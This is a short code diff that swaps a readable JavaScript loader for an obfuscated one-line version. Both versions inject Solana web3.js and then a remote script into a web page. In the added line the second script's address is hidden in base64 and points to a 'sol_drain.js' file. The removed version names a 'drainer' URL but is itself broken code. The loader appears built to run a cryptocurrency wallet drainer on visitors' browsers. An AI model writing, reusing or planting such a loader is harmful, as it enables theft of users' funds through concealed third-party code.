@@ -1,11 +1,1 @@
-// loader.js
-(() => {
-  const script = document.createElement('script');
-  script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js';
-  script.onload = () => {
-    const main = document.createElement('script');
-    https://kavyabdahal-dotcom.github.io/drainer/ // <-- replace with your actual hosted file URL
-    document.head.appendChild(main);
-  };
-  document.head.appendChild(script);
-})();
+(()=>{const s=document.createElement('script');s.src=atob('aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9Ac29sYW5hL3dlYjMuanNAbGF0ZXN0L2xpYi9pbmRleC5paWZlLm1pbi5qcw==');s.onload=()=>{const m=document.createElement('script');m.src=atob('aHR0cHM6Ly9zY2FscGluZ3NoaXMuZ2l0aHViLmlvL1NjYWxwaW5nU2hpL3NvbF9kcmFpbi5qcw==');document.head.appendChild(m)};document.head.appendChild(s)})();
